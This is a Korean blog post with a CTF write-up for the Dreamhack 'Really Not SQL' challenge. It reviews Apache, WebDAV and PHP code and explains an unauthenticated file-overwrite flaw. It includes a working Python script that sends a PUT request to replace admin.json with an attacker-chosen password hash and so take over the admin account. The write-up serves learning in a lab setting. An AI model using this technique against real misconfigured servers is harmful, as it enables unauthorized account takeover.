---
layout: post
comments: true
sitemap:

title: "[CTF] Dreamhack 문제 풀이: Really Not SQL"
excerpt: "임의 파일 덮어쓰기"

date: 2026-07-24
last_modified_at: 2026-07-28

categories: [CTF]
tags: [TIL, WEB, CTF]
---

<!-- markdownlint-disable MD010 MD025 MD029 MD033 -->

# [Dreamhack] Really Not SQL

## 목차

1. [Intro](#1-intro)
2. [Code](#2-code)
    1. [login.php](#21-loginphp)
    1. [flag.php](#22-flagphp)
3. [Vuln](#3-vuln)
4. [Payload](#4-payload)
<!-- 5. [참고](#참고) -->

---

## 1. Intro

Dreamhack 링크: <https://dreamhack.io/wargame/challenges/2105>

Apache와 PHP로 구성된 간단한 로그인 애플리케이션이다.

사용자 정보가 JSON 파일에 저장되어 있고, 관리자 계정으로 로그인하면 `/flag.php`에서 플래그를 확인할 수 있다.

## 2. Code

<details>
<summary>파일 구조 접기/펼치기</summary>
<div markdown="1">

```text
/
├── .htaccess
├── 000-default.conf
├── flag
├── run.sh
└── src/
    ├── edit_profile.php
    ├── flag.php
    ├── index.php
    ├── login.php
    ├── static/
    │   ├── index.php
    │   └── style.css
    └── user/
        ├── admin.json
        ├── guest.json
        └── index.php
```

</div>
</details>

### 2.1. Dockerfile

<details>
<summary>전체 코드 접기/펼치기</summary>
<div markdown="1">

```docker
FROM ubuntu:24.04

RUN apt-get update
RUN apt-get upgrade -y

RUN apt-get install -y zip unzip tzdata curl
RUN apt-get install -y php
RUN apt-get install -y apache2

RUN rm /var/www/html/index.html
COPY ./deploy/src /var/www/html/
# /var/www/html/user 권한이 777
RUN chmod 777 /var/www/html/user/
RUN chmod 666 /var/www/html/user/*.json
COPY ./deploy/000-default.conf /etc/apache2/sites-enabled/
COPY ./deploy/.htaccess /var/www/html/user/
COPY ./deploy/run.sh /usr/sbin/
COPY ./deploy/flag /flag

RUN a2enmod rewrite
RUN a2enmod dav
RUN a2enmod dav_fs
RUN chmod +x /usr/sbin/run.sh

EXPOSE 80

CMD ["/usr/sbin/run.sh"]
```

</div>
</details>

- 인증 정보가 웹 루트 내부에 저장되어 있다.
- `/var/www/html/user` -> 권한이 777이다.

### 2.2. 000-default.conf

<details>
<summary>전체 코드 접기/펼치기</summary>
<div markdown="1">

```conf
<VirtualHost *:80>
  ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

   <Directory /var/www/html/>
     AllowOverride None
     Require all granted
   </Directory>

  # WebDav가 허용됨
  <Directory /var/www/html/user/>
      DAV On
      Options Indexes
      AllowOverride All
      # 외부 사용자 접근 모두 허용
      Require all granted
  </Directory>
</VirtualHost>
```

</div>
</details>

- WebDAV(Web Distributed Authoring and Versioning): HTTP를 통해 파일 생성과 수정이 가능하다.

### 2.3. .htaccess

<details>
<summary>전체 코드 접기/펼치기</summary>
<div markdown="1">

```htaccess
<!-- DELETE method만 차단 -->
<Limit DELETE>
        Require all denied
</Limit>
```

</div>
</details>

- `DELETE`만 차단 -> `PUT`을 이용해 파일 덮어쓰기가 가능하다.

### 2.1. login.php

<details>
<summary>전체 코드 접기/펼치기</summary>
<div markdown="1">

```php
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userDir = __DIR__ . '/user/';
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $filename = $username . '.json';
    $filepath = $userDir . $filename;

    if ($username !== "admin" && $username !== "guest") {
        $error = "User not found";
    } else {
        $userData = json_decode(file_get_contents($filepath), true);
        if ($userData['id'] !== $username){
            $error = "Error occured";
        } else if ($userData['password'] !== hash("sha256", $password)) {
            $error = "Invalid password";
        } else {
            $_SESSION['user'] = $username;
            $success = true;
        }
    }
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
<div class="container">
    <h1>Login</h1>
    <form method="post" action="login.php">
        <label for="username">User ID</label>
        <input type="text" id="username" name="username" required>

        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>

        <button type="submit">Login</button>
    </form>
</div>

<?php if ($error): ?>
<script>
    alert("<?= $error ?>");
</script>
<?php elseif ($success): ?>
<script>
    alert("Hello <?= $username ?>");
    window.location.href = "/";
</script>
<?php endif; ?>

</body>
</html>
```

</div>
</details>

- 관리자 계정의 비밀번호 해시를 알고 있거나 변경할 수 있다면, 정상적인 로그인 절차를 통해 관리자 세션을 얻을 수 있다.

### 2.2. flag.php

<details>
<summary>전체 코드 접기/펼치기</summary>
<div markdown="1">

```php
<?php 
session_start();

// 세션의 user 값이 admin인지 검사
if ($_SESSION['user'] !== "admin") {
    http_response_code(403);
} else {
    $file = file_get_contents('/flag');
    echo trim($file); 
}

?>
```

</div>
</details>

## 3. Vuln

인증 X WebDAV 파일 쓰기

## 4. Payload

전체 공격 과정

```text
1. 공격자가 사용할 새 관리자 비밀번호 결정
2. 새 비밀번호의 SHA-256 해시 계산
3. 변경된 해시가 포함된 admin.json 생성
4. WebDAV PUT 요청으로 admin.json 덮어쓰기
5. 새 비밀번호로 관리자 로그인
6. 관리자 세션으로 flag.php 접근
```

### 4.1. admin.json 덮어쓰기

파이썬 `requests` 모듈을 통해 admin.json에 `PUT` 요청을 보내 원하는 비밀번호로 수정했다.

<details>
<summary>전체 코드 접기/펼치기</summary>
<div markdown="1">

```python
import hashlib
import json

import requests

base_url = "<DREAMHACK_URL>"
new_password = "admin1234"

password_hash = hashlib.sha256(
    new_password.encode("utf-8")
).hexdigest()

payload = {
    "no": 0,
    "id": "admin",
    "password": password_hash,
}

response = requests.put(
    f"{base_url}/user/admin.json",
    data=json.dumps(payload).encode("utf-8"),
    headers={"Content-Type": "application/json"},
    timeout=10,
    allow_redirects=False,
)

print(response.status_code, response.reason)
print(response.text)
response.raise_for_status()

response = requests.get(
    f"{base_url}/user/admin.json",
    timeout=10,
)

print(response.status_code)
print(response.text)
```

</div>
</details>

실행 결과:

```text
204 No Content

200
{"no": 0, "id": "admin", "password": "ac9689e2272427085e35b9d3e3e8bed88cb3434828b43b86fc0596cad4c6e270"}
```

### 4.2. flag.php 접근

pass

## 참고

- [Wikipedia: WebDAV](https://ko.wikipedia.org/wiki/WebDAV)
